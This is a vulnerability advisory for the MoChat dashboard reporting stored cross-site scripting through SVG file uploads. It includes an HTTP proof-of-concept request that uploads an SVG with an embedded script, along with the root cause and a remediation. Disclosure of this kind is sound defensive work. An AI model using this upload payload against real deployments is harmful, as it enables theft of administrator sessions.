# MoChat — 后台上传允许 SVG 导致存储型 XSS (MC-VULN-010)

| Field | Value |
|-------|-------|
| **Vendor** | mochat-cloud |
| **Product** | MoChat |
| **Version** | master（Hyperf 2.2） |
| **Type** | Cross-Site Scripting |
| **CWE** | CWE-79 / CWE-434 |
| **Authentication** | Authenticated dashboard user |

## Summary

`POST /dashboard/common/upload` allows `svg` mimes. Files served from public `/static/` without Content-Disposition sandbox.

## Root cause

`Upload.php` mimes list includes svg + `server.php` static handler.

## Proof of Concept

```http
POST /dashboard/common/upload HTTP/1.1
Host: 127.0.0.1:9501
Authorization: Bearer ADMIN_TOKEN
Content-Type: multipart/form-data; boundary=----BOUNDARY
Connection: close

------BOUNDARY
Content-Disposition: form-data; name="file"; filename="poc.svg"
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
------BOUNDARY--
```

**Expected:** HTTP 200 with `fullPath` under `/static/`; GET returns script verbatim

## Impact

Session theft when admin opens malicious SVG URL.

## Remediation

Remove svg from allowlist; serve uploads with `Content-Disposition: attachment`.

## References

- Audit: `SECURITY_AUDIT_REPORT.md` §MC-VULN-010
- PoC: `POC_VERIFICATION_REPORT.md`
